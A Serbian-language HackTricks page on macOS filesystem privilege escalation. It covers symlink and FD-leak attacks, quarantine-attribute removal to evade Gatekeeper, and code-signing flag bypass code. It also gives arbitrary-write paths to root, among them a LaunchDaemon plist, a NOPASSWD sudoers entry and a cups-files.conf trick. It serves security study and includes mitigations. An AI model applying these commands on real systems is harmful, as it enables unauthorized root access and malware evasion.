# macOS FS trikovi

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacije POSIX dozvola

Za **direktorijum**, tri bita dozvola znače nešto drugačije nego za običnu datoteku. `chmod(1)` izvršni bit naziva "**search**" kada se primeni na direktorijum:<sup>[[2]](#references)</sup>

> `0100` Za datoteke dozvoljava izvršavanje vlasniku. Za direktorijume vlasniku dozvoljava **pretragu** direktorijuma.

- **read** - možete **nabrojati** unose direktorijuma (izlistati imena).
- **write** - možete **kreirati, preimenovati i brisati unose** u direktorijumu. Imajte na umu da je ovo svojstvo *sadržavajućeg* direktorijuma, a ne datoteke: možete obrisati datoteku koju ne možete čitati ili menjati, sve dok možete menjati njen nadređeni direktorijum.
- Da biste obrisali **poddirektorijum**, on mora biti prazan, što zauzvrat zahteva dovoljno prava za uklanjanje svega što se nalazi u njemu.
- Ako direktorijum ima **sticky bit** (`S_ISVTX`, kao `/tmp`), ovo je ograničeno — POSIX navodi da proces tada može obrisati ili preimenovati datoteke u njemu samo ako je njihov vlasnik, vlasnik direktorijuma ili ima odgovarajuće privilegije.<sup>[[1]](#references)</sup>
- **execute / search** - **dozvoljeno vam je da prolazite kroz** direktorijum. Rezolucija putanje pronalazi svaku komponentu "u direktorijumu koji je naveden njenim prethodnikom", pa **gubitak prava pretrage na bilo kojoj pojedinačnoj komponenti prefiksa putanje čini sve ispod nje nedostupnim putem putanje**, čak i ako je sama krajnja datoteka čitljiva za sve korisnike.<sup>[[1]](#references)</sup>

### Opasne kombinacije

**Kako prepisati datoteku/direktorijum čiji je vlasnik root**, ali:

- Vlasnik jednog nadređenog **direktorijuma** u putanji je korisnik
- Vlasnik jednog nadređenog **direktorijuma** u putanji je **users grupa** sa **write** pristupom
- Jedna **grupa** korisnika ima **write** pristup **datoteci**

Kod bilo koje od prethodnih kombinacija, napadač bi mogao da **ubaci** **sym/hard link** na očekivanu putanju i dobije privilegovani arbitrary write.

### Poseban slučaj root direktorijuma sa R+X dozvolama

Ovo direktno proizlazi iz prethodno navedenog pravila rezolucije putanje. Ako direktorijum daje **R+X samo root-u**, datoteke unutar njega su *putem putanje* nedostupne svima ostalima — ali sopstveni bitovi dozvola **datoteka** i dalje mogu biti permisivni. Direktorijum je jedina prepreka.

Zato se svaki primitive koji vam omogućava da izvučete datoteku **iz tog direktorijuma** — privilegovani proces koji **premešta/preimenuje/kopira** putanju koju je izabrao napadač na lokaciju kroz koju možete prolaziti — pretvara u arbitrary read, bez potrebe da se ikada zaobiđe sopstveni mode datoteke:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Potražite privileged file movers (installere, rotatore logova, crash/diagnostic collectore, backup i „export“ funkcije) koji prihvataju source path od korisnika sa nižim privilegijama.

## Symbolic Link / Hard Link

### Permissive file/folder

Ako privileged proces upisuje podatke u **file** koji može biti **kontrolisan** od strane **korisnika sa nižim privilegijama**, ili koji je korisnik sa nižim privilegijama mogao **prethodno kreirati**. Korisnik može jednostavno da ga **usmeri na drugi file** pomoću Symbolic ili Hard link-a, pa će privileged proces upisivati u taj file.

Proverite druge odeljke u kojima bi napadač mogao da **zloupotrebi arbitrary write za eskalaciju privilegija**.

### Open `O_NOFOLLOW`

Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Ako se `O_NOFOLLOW` koristi u maski, a ciljni file prosleđen funkciji `open()` jeste symbolic link, tada će `open()` biti neuspešan.“* Proverava se samo **poslednja** komponenta — svaka **međukomponenta** se i dalje razrešava i prati. Zato developer koji je „zaštitio“ upis pomoću `O_NOFOLLOW` i dalje može biti napadnut postavljanjem symbolic link-a u bilo koji **nadređeni direktorijum** ciljne putanje.<sup>[[3]](#references)</sup>

Ista man stranica dokumentuje flag-ove koji zaista zatvaraju tu prazninu:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *„ako je ... bilo koja komponenta putanje prosleđene funkciji `open()` symbolic link, tada će `open()` biti neuspešan.“*
- **`O_RESOLVE_BENEATH`** — *„ako ... navedeno razrešavanje putanje izađe iz direktorijuma povezanog sa fd-om, tada će `openat()` biti neuspešan.“*

U suprotnom, `openat()` relativno u odnosu na directory FD koji ste već validirali, ili `realpath()` + ponovna validacija, predstavljaju preostale načine za sprečavanje zamene symbolic link-a u sredini putanje.

## .fileloc

File-ovi sa ekstenzijom **`.fileloc`** mogu upućivati na druge aplikacije ili binarne file-ove, tako da će, kada se otvore, upravo ta aplikacija/binarni file biti izvršen.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskriptori datoteka

### Leak FD (bez `O_CLOEXEC`)

Ako poziv funkcije `open` nema oznaku `O_CLOEXEC`, deskriptor datoteke će biti nasleđen od strane podređenog procesa. Dakle, ako privilegovani proces otvori privilegovanu datoteku i izvrši proces kojim upravlja attacker, attacker će **naslediti FD ka privilegovanoj datoteci**.

Klasičan primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` je poštovao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim datotekama**, zato što je ta konkretna promenljiva parsirana izvan `processDyldEnvironmentVariable()`.
- Izvršavao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, čime je **kreirao datoteku u vlasništvu root-a na proizvoljnoj putanji**.
- FD **nikada nije bio zatvoren i nije imao close-on-exec oznaku**, pa je svaki podređeni proces suid binarne datoteke nasledio **upisiv FD ka datoteci u vlasništvu root-a**.
- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u podređenom procesu, omogućilo je proizvoljne upise u datoteke u vlasništvu root-a; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, omogućavajući prepisivanje umesto dodavanja na kraj.

Isti obrazac se pojavljuje svaki put kada privilegovani proces otvori datoteku **pre nego što** izvrši nešto što vi kontrolišete (helper tools, editore u stilu `crontab`-a pokrenute preko `$EDITOR`, log/debug datoteke otvorene sa putanje iz env varijable...). Nabrojte FD-ove koje ste nasledili pomoću:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Sve iznad `2` što pokazuje na datoteku koju ne možete sami da otvorite predstavlja arbitrary-write (ili arbitrary-read) primitive.

## Izbegavajte trikove sa quarantine xattrs

### Uklonite ga
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ako datoteka/fascikla ima ovaj immutable atribut, neće biti moguće postaviti xattr na nju
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemi datoteka bez podrške za xattr

Ne čuva svaki sistem datoteka koji macOS može da montira **extended attributes** izvorno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS mount-ova ih ne podržava** — macOS ih emulira upisivanjem **AppleDouble** pomoćne datoteke pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

To je važno za quarantine, jer xattr opstaje samo ako se zaista može upisati **i ponovo pročitati** sa istog volumena:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Ako se tom volumenu kasnije pristupi preko putanje koja ignoriše prateći `._` fajl (ili se prateći fajl ukloni/obriše), fajl stiže **bez quarantine zastavice** — a `.app` bez quarantine zastavice dovoljan je za izlazak iz App Sandbox-a, kao što je objašnjeno u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ovaj ACL sprečava dodavanje `xattrs` fajlu
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format datoteke **AppleDouble** kopira datoteku zajedno sa njenim ACE-ovima.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će tekstualna reprezentacija ACL-a, sačuvana unutar xattr-a pod nazivom **`com.apple.acl.text`**, biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste aplikaciju kompresovali u zip datoteku koristeći format datoteke **AppleDouble** sa ACL-om koji sprečava upisivanje drugih xattr-ova u nju... quarantine xattr nije postavljen u aplikaciju:

Pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.<sup>[[6]](#references)</sup>

Da bismo ovo replicirali, prvo moramo dobiti ispravan ACL string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Napomena: čak i ako ovo funkcioniše, sandbox prethodno upisuje quarantine xattr)

Nije zaista potrebno, ali ostavljam ovde za svaki slučaj:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Zaobilaženje provera potpisa

### Zaobilaženje provera platformskih binarnih fajlova

Neke bezbednosne provere proveravaju da li je binarni fajl **platform binary**, na primer da bi dozvolile povezivanje sa XPC servisom. Međutim, kao što je prikazano u tekstu o zaobilaženju na https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, ovu proveru je moguće zaobići tako što se preuzme platform binary (kao što je /bin/ls) i exploit ubaci putem dyld-a koristeći promenljivu okruženja `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Zaobilaženje zastavica `CS_REQUIRE_LV` i `CS_FORCED_LV`

Moguće je da izvršavajući binarni fajl izmeni sopstvene zastavice kako bi zaobišao provere, pomoću koda kao što je:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Zaobilaženje Code Signatures

Bundles sadrže fajl **`_CodeSignature/CodeResources`** koji sadrži **hash** svakog pojedinačnog **fajla** u **bundle-u**. Imajte na umu da je hash fajla CodeResources takođe **ugrađen u izvršni fajl**, tako da ni njega ne možemo menjati.

Međutim, postoje neki fajlovi čiji se potpis neće proveravati; oni imaju ključ `omit` u plist-u, kao što je:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Moguće je izračunati potpis resursa iz CLI-ja pomoću:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montiranje dmg-ova

Korisnik može da montira prilagođeni dmg kreiran čak i preko nekih postojećih foldera. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Obično macOS montira disk tako što komunicira sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u LaunchDaemons plist datoteku i servis ponovo pokrene, logovi će se čuvati u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate poput `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.

## Arbitrary Writes

### Periodic sh skripte

Ako vaša skripta može da se interpretira kao **shell script**, možete prepisati **`/etc/periodic/daily/999.local`** shell skriptu koja će se pokretati svakog dana.

Možete **simulirati** izvršavanje ove skripte pomoću: **`sudo periodic daily`**

### Daemoni

Upišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist datotekom koja izvršava proizvoljnu skriptu, kao što je:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Samo generišite skriptu `/Applications/Scripts/privesc.sh` sa **commands** koje želite da pokrenete kao root.

### Sudoers File

Ako imate **arbitrary write**, možete kreirati fajl unutar foldera **`/etc/sudoers.d/`** koji vam dodeljuje **sudo** privilegije.

### PATH fajlovi

Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env promenljivu. Morate biti root da biste ga prepisali, ali ako skripta iz **privileged process** izvršava neku **command without the full path**, možda ćete moći da je **hijack** tako što ćete izmeniti ovaj fajl.

Takođe možete upisivati fajlove u **`/etc/paths.d`** da biste učitali nove foldere u `PATH` env promenljivu.

### cups-files.conf

Ova tehnika je korišćena u [ovom writeup-u](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Kreirajte fajl `/etc/cups/cups-files.conf` sa sledećim sadržajem:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Ovo će kreirati datoteku `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni sadržaj na kraju služi za pokretanje kreiranja error log-a.

Zatim u `/etc/sudoers.d/lpe` upišite potrebnu konfiguraciju za escalate privileges, kao što je `%staff ALL=(ALL) NOPASSWD:ALL`.

Zatim ponovo izmenite datoteku `/etc/cups/cups-files.conf`, navodeći `LogFilePerm 700`, kako bi nova sudoers datoteka postala validna prilikom pozivanja `cupsctl`.

### Escape iz sandbox-a

Moguće je escape-ovati macOS sandbox pomoću FS arbitrary write. Za nekoliko primera pogledajte stranicu [macOS Auto Start](../../../../macos-auto-start-locations.md), ali uobičajen primer je upisivanje Terminal preferences datoteke u `~/Library/Preferences/com.apple.Terminal.plist`, koja izvršava komandu pri pokretanju, i njeno pozivanje pomoću `open`.

## Generisanje datoteka koje mogu da se upisuju kao drugi korisnici

Veoma čest privesc primitive jeste da **privileged process kreira datoteku za vas** u direktorijumu koji kontrolišete, a zatim zadržavanje **write access** nad tom datotekom. Potrebna su dva elementa:

1. Direktorijum čiji ste vlasnik (ili u kojem možete postaviti **inheritable ACL**), tako da sve što se u njemu kreira nasleđuje vaše dozvole.
2. Privileged/`suid` proces kojem se može saopštiti **gde** da kreira datoteku — obično pomoću debug/logging environment variable-a, config datoteke ili helper-ovog XPC API-ja.

**Inheritable ACL** deo je ono što kreiranu datoteku čini writable za vas, iako je njen vlasnik drugi korisnik. Flag-ovi nasleđivanja `file_inherit` / `directory_inherit` dokumentovani su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Sada je svaka datoteka koju privilegovani proces kreira unutar `$DIRNAME` **upisiva za vas**. Ako je taj direktorijum takođe lokacija iz koje se kasnije nešto **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon-a...), ovo predstavlja direktnu root eskalaciju. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta treba upisati kada dobijete datoteku.

Za kompletan primer lanca „env promenljiva natera root proces da kreira datoteku, a FD procuri do vas“, pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.

## POSIX deljena memorija

**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama komunikacije između procesa. To podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, podešavanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa korišćenjem `mmap()`. Procesi zatim mogu direktno da čitaju iz ove memorijske oblasti i upisuju u nju. Za upravljanje istovremenim pristupom i sprečavanje oštećenja podataka često se koriste mehanizmi za sinhronizaciju, kao što su mutex-i ili semafori. Na kraju, procesi uklanjaju mapiranje i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a opciono uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brz i učinkovit IPC u okruženjima u kojima više procesa mora brzo da pristupa deljenim podacima.

<details>

<summary>Primer koda producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Primer koda potrošača</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded Descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **operacija nad deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptori pružaju način za povezivanje određenih ograničenja ili „zaštita“ sa deskriptorima datoteka, koja sprovodi kernel.

Ova funkcija je posebno korisna za sprečavanje određenih klasa bezbednosnih ranjivosti, kao što su **neovlašćeni pristup datotekama** ili **race conditions**. Ove ranjivosti nastaju, na primer, kada thread pristupa opisu datoteke, čime **drugom ranjivom thread-u omogućava pristup**, ili kada **ranjivi child proces nasledi** deskriptor datoteke. Neke funkcije povezane sa ovom funkcionalnošću su:

- `guarded_open_np`: Otvara FD sa zaštitom
- `guarded_close_np`: Zatvara ga
- `change_fdguard_np`: Menja zastavice zaštite na deskriptoru (čak i uklanja zaštitu deskriptora)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
